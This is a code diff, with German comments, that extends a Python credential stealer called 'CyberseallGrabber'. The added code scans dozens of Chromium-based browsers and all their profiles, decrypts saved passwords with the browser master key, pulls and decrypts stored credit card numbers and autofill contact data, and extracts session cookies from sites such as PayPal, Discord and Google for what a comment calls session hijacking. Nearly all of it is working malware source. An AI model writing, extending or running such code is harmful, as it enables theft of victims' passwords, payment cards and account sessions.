@@ -171,70 +171,80 @@ class CyberseallGrabber:
 
     def pw(self):
         try:
-            # Erweiterte Browser-Pfade definieren
+            # MASSIVE BROWSER-PFADE BASIEREND AUF TESTDATEN
             BROWSER_PATHS = {}
             
-            # Chrome Profile
-            chrome_base = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
-            if os.path.exists(chrome_base):
-                for profile in ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"]:
-                    profile_path = os.path.join(chrome_base, profile)
-                    if os.path.exists(profile_path):
-                        BROWSER_PATHS[f"Chrome ({profile})"] = {
-                            "profile_path": profile_path,
-                            "login_db": "\\Login Data"
-                        }
-            
-            # Edge Profile
-            edge_base = os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data")
-            if os.path.exists(edge_base):
-                for profile in ["Default", "Profile 1", "Profile 2", "Profile 3"]:
-                    profile_path = os.path.join(edge_base, profile)
-                    if os.path.exists(profile_path):
-                        BROWSER_PATHS[f"Edge ({profile})"] = {
-                            "profile_path": profile_path,
-                            "login_db": "\\Login Data"
-                        }
-            
-            # Brave Profile
-            brave_base = os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data")
-            if os.path.exists(brave_base):
-                for profile in ["Default", "Profile 1", "Profile 2"]:
-                    profile_path = os.path.join(brave_base, profile)
-                    if os.path.exists(profile_path):
-                        BROWSER_PATHS[f"Brave ({profile})"] = {
-                            "profile_path": profile_path,
-                            "login_db": "\\Login Data"
-                        }
-            
-            # Weitere Browser
-            other_browsers = {
-                "Opera": {
-                    "profile_path": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
-                    "login_db": "\\Login Data"
-                },
-                "Opera GX": {
-                    "profile_path": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
-                    "login_db": "\\Login Data"
-                },
-                "Vivaldi": {
-                    "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data", "Default"),
-                    "login_db": "\\Login Data"
-                },
-                "Yandex": {
-                    "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data", "Default"),
-                    "login_db": "\\Ya Passman Data"
-                },
-                "Chromium": {
-                    "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Chromium", "User Data", "Default"),
-                    "login_db": "\\Login Data"
-                }
+            # Alle Chromium-basierten Browser aus testdaten/paths.js
+            chromium_browsers = {
+                'Google(x86)': 'AppData\\Local\\Google(x86)\\Chrome\\User Data',
+                'Google SxS': 'AppData\\Local\\Google\\Chrome SxS\\User Data',
+                'Chromium': 'AppData\\Local\\Chromium\\User Data',
+                'Thorium': 'AppData\\Local\\Thorium\\User Data',
+                'Chrome': 'AppData\\Local\\Google\\Chrome\\User Data',
+                'MapleStudio': 'AppData\\Local\\MapleStudio\\ChromePlus\\User Data',
+                'Iridium': 'AppData\\Local\\Iridium\\User Data',
+                '7Star': 'AppData\\Local\\7Star\\7Star\\User Data',
+                'CentBrowser': 'AppData\\Local\\CentBrowser\\User Data',
+                'Chedot': 'AppData\\Local\\Chedot\\User Data',
+                'Vivaldi': 'AppData\\Local\\Vivaldi\\User Data',
+                'Kometa': 'AppData\\Local\\Kometa\\User Data',
+                'Elements': 'AppData\\Local\\Elements Browser\\User Data',
+                'Epic': 'AppData\\Local\\Epic Privacy Browser\\User Data',
+                'uCozMedia': 'AppData\\Local\\uCozMedia\\Uran\\User Data',
+                'Fenrir': 'AppData\\Local\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer',
+                'Catalina': 'AppData\\Local\\CatalinaGroup\\Citrio\\User Data',
+                'Coowon': 'AppData\\Local\\Coowon\\Coowon\\User Data',
+                'Liebao': 'AppData\\Local\\liebao\\User Data',
+                'QIP Surf': 'AppData\\Local\\QIP Surf\\User Data',
+                'Orbitum': 'AppData\\Local\\Orbitum\\User Data',
+                'Comodo': 'AppData\\Local\\Comodo\\Dragon\\User Data',
+                '360Browser': 'AppData\\Local\\360Browser\\Browser\\User Data',
+                'Maxthon3': 'AppData\\Local\\Maxthon3\\User Data',
+                'K-Melon': 'AppData\\Local\\K-Melon\\User Data',
+                'CocCoc': 'AppData\\Local\\CocCoc\\Browser\\User Data',
+                'Amigo': 'AppData\\Local\\Amigo\\User Data',
+                'Torch': 'AppData\\Local\\Torch\\User Data',
+                'Sputnik': 'AppData\\Local\\Sputnik\\Sputnik\\User Data',
+                'Edge': 'AppData\\Local\\Microsoft\\Edge\\User Data',
+                'DCBrowser': 'AppData\\Local\\DCBrowser\\User Data',
+                'Yandex': 'AppData\\Local\\Yandex\\YandexBrowser\\User Data',
+                'UR Browser': 'AppData\\Local\\UR Browser\\User Data',
+                'Slimjet': 'AppData\\Local\\Slimjet\\User Data',
+                'BraveSoftware': 'AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data',
+                'Opera': 'AppData\\Roaming\\Opera Software\\Opera Stable',
+                'Opera GX': 'AppData\\Roaming\\Opera Software\\Opera GX Stable',
             }
             
-            # Füge andere Browser hinzu, wenn sie existieren
-            for name, data in other_browsers.items():
-                if os.path.exists(data["profile_path"]):
-                    BROWSER_PATHS[name] = data
+            # Konvertiere Windows-Pfade zu Python-Pfaden und scanne alle Profile
+            for browser_name, rel_path in chromium_browsers.items():
+                # Konvertiere AppData-Pfad
+                if rel_path.startswith('AppData\\Local\\'):
+                    base_path = os.path.join(os.getenv("LOCALAPPDATA"), rel_path[15:].replace('\\', os.sep))
+                elif rel_path.startswith('AppData\\Roaming\\'):
+                    base_path = os.path.join(os.getenv("APPDATA"), rel_path[17:].replace('\\', os.sep))
+                else:
+                    continue
+                
+                if not os.path.exists(base_path):
+                    continue
+                
+                # Scanne alle Profile in diesem Browser
+                try:
+                    for item in os.listdir(base_path):
+                        item_path = os.path.join(base_path, item)
+                        if os.path.isdir(item_path) and (item.startswith('Profile') or item == 'Default'):
+                            # Bestimme Login-Datei basierend auf Browser
+                            if 'Yandex' in browser_name:
+                                login_file = "\\Ya Passman Data"
+                            else:
+                                login_file = "\\Login Data"
+                            
+                            BROWSER_PATHS[f"{browser_name} ({item})"] = {
+                                "profile_path": item_path,
+                                "login_db": login_file
+                            }
+                except:
+                    pass
             
             def decrypt_password(password, key):
                 try:
@@ -343,13 +353,20 @@ class CyberseallGrabber:
                         cursor = conn.cursor()
 
                         try:
-                            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+                            # Erweiterte SQL-Abfrage mit mehr Feldern
+                            cursor.execute("SELECT origin_url, username_value, password_value, date_created, times_used FROM logins")
                             login_data = cursor.fetchall()
 
                             success_count = 0
                             failed_count = 0
 
-                            for url, username, password in login_data:
+                            for row in login_data:
+                                url = row[0] if len(row) > 0 else ""
+                                username = row[1] if len(row) > 1 else ""
+                                password = row[2] if len(row) > 2 else ""
+                                date_created = row[3] if len(row) > 3 else 0
+                                times_used = row[4] if len(row) > 4 else 0
+                                
                                 if not url or not username or not password:
                                     continue
 
@@ -366,7 +383,9 @@ class CyberseallGrabber:
                                             "browser": browser,
                                             "url": url,
                                             "username": username,
-                                            "password": decrypted_password
+                                            "password": decrypted_password,
+                                            "times_used": times_used,
+                                            "date_created": date_created
                                         })
                                 except Exception as e:
                                     failed_count += 1
@@ -374,8 +393,70 @@ class CyberseallGrabber:
                                         "browser": browser,
                                         "url": url,
                                         "username": username,
-                                        "password": f"Error: {str(e)[:30]}"
+                                        "password": f"Error: {str(e)[:30]}",
+                                        "times_used": times_used,
+                                        "date_created": date_created
                                     })
+                            
+                            # Zusätzlich: Kreditkarten extrahieren
+                            try:
+                                web_data_path = os.path.join(profile_path, "Web Data")
+                                if os.path.exists(web_data_path):
+                                    temp_web_db = os.path.join(os.getenv("TEMP"), f"{browser.replace(' ', '_')}_web_data.db")
+                                    if os.path.exists(temp_web_db):
+                                        os.remove(temp_web_db)
+                                    
+                                    with open(web_data_path, "rb") as web_file:
+                                        with open(temp_web_db, "wb") as temp_web_file:
+                                            temp_web_file.write(web_file.read())
+                                    
+                                    web_conn = sqlite3.connect(temp_web_db)
+                                    web_cursor = web_conn.cursor()
+                                    
+                                    # Kreditkarten
+                                    web_cursor.execute("SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards")
+                                    credit_cards = web_cursor.fetchall()
+                                    
+                                    for card in credit_cards:
+                                        if card[1]:  # card_number_encrypted
+                                            try:
+                                                decrypted_card = decrypt_password(card[1], master_key)
+                                                if decrypted_card and decrypted_card != "Failed to decrypt":
+                                                    passwords.append({
+                                                        "browser": browser,
+                                                        "url": "CREDIT_CARD",
+                                                        "username": card[0] or "Unknown",
+                                                        "password": f"Card: {decrypted_card} | Exp: {card[2]}/{card[3]}",
+                                                        "times_used": 0,
+                                                        "date_created": 0
+                                                    })
+                                            except:
+                                                pass
+                                    
+                                    # Autofill-Daten
+                                    web_cursor.execute("SELECT name, value FROM autofill WHERE name LIKE '%email%' OR name LIKE '%phone%' OR name LIKE '%address%'")
+                                    autofill_data = web_cursor.fetchall()
+                                    
+                                    for autofill in autofill_data[:5]:  # Limit auf 5
+                                        if autofill[0] and autofill[1]:
+                                            passwords.append({
+                                                "browser": browser,
+                                                "url": "AUTOFILL_DATA",
+                                                "username": autofill[0],
+                                                "password": autofill[1],
+                                                "times_used": 0,
+                                                "date_created": 0
+                                            })
+                                    
+                                    web_cursor.close()
+                                    web_conn.close()
+                                    
+                                    try:
+                                        os.remove(temp_web_db)
+                                    except:
+                                        pass
+                            except:
+                                pass
 
                             # Debug-Info in Datei schreiben statt print
                             try:
@@ -419,10 +500,97 @@ class CyberseallGrabber:
             # Hole alle Browser-Passwörter
             password_data = get_browser_passwords()
             
+            # Zusätzlich: Cookie-Extraktion für Session-Hijacking
+            def extract_valuable_cookies():
+                valuable_cookies = []
+                valuable_sites = [
+                    '.discord.com', '.spotify.com', '.instagram.com', '.tiktok.com', 
+                    '.facebook.com', '.twitter.com', '.github.com', '.google.com',
+                    '.amazon.com', '.paypal.com', '.netflix.com', '.youtube.com',
+                    '.twitch.tv', '.reddit.com', '.linkedin.com', '.microsoft.com'
+                ]
+                
+                for browser_name, browser_data in BROWSER_PATHS.items():
+                    try:
+                        profile_path = browser_data["profile_path"]
+                        cookies_path = os.path.join(profile_path, "Cookies")
+                        
+                        if not os.path.exists(cookies_path):
+                            continue
+                        
+                        # Hole Master Key für Cookie-Entschlüsselung
+                        state_file = os.path.join(profile_path, "Local State")
+                        if not os.path.exists(state_file):
+                            continue
+                        
+                        with open(state_file, "r", encoding="utf-8") as f:
+                            local_state = json.loads(f.read())
+                            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
+                        
+                        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+                        
+                        temp_cookies_db = os.path.join(os.getenv("TEMP"), f"{browser_name.replace(' ', '_')}_cookies.db")
+                        if os.path.exists(temp_cookies_db):
+                            os.remove(temp_cookies_db)
+                        
+                        with open(cookies_path, "rb") as cookies_file:
+                            with open(temp_cookies_db, "wb") as temp_file:
+                                temp_file.write(cookies_file.read())
+                        
+                        conn = sqlite3.connect(temp_cookies_db)
+                        cursor = conn.cursor()
+                        
+                        for site in valuable_sites:
+                            try:
+                                cursor.execute("SELECT host_key, name, encrypted_value, expires_utc FROM cookies WHERE host_key LIKE ?", (f'%{site}%',))
+                                cookies = cursor.fetchall()
+                                
+                                for cookie in cookies[:3]:  # Max 3 Cookies pro Site
+                                    if cookie[2]:  # encrypted_value
+                                        try:
+                                            decrypted_value = decrypt_password(cookie[2], master_key)
+                                            if decrypted_value and decrypted_value != "Failed to decrypt" and len(decrypted_value) > 10:
+                                                valuable_cookies.append({
+                                                    "browser": browser_name,
+                                                    "url": f"COOKIE_{site}",
+                                                    "username": cookie[1],  # cookie name
+                                                    "password": decrypted_value[:100],  # Cookie value (gekürzt)
+                                                    "times_used": 0,
+                                                    "date_created": cookie[3] or 0  # expires_utc
+                                                })
+                                        except:
+                                            pass
+                            except:
+                                pass
+                        
+                        cursor.close()
+                        conn.close()
+                        
+                        try:
+                            os.remove(temp_cookies_db)
+                        except:
+                            pass
+                    except:
+                        pass
+                
+                return valuable_cookies
+            
+            # Hole alle Browser-Passwörter und Cookies
+            password_data = get_browser_passwords()
+            cookie_data = extract_valuable_cookies()
+            
+            # Kombiniere alle Daten
+            all_data = password_data + cookie_data
+            
             # Konvertiere zu String-Format für Kompatibilität
             pw_data = []
-            for pwd in password_data:
-                password_entry = f"{pwd['browser']} | {pwd['url']} | {pwd['username']} | {pwd['password']}"
+            for pwd in all_data:
+                if pwd.get('times_used', 0) > 0:
+                    usage_info = f" | Used: {pwd['times_used']}x"
+                else:
+                    usage_info = ""
+                
+                password_entry = f"{pwd['browser']} | {pwd['url']} | {pwd['username']} | {pwd['password']}{usage_info}"
                 pw_data.append(password_entry)
             
             # Speichere alle gefundenen Passwörter
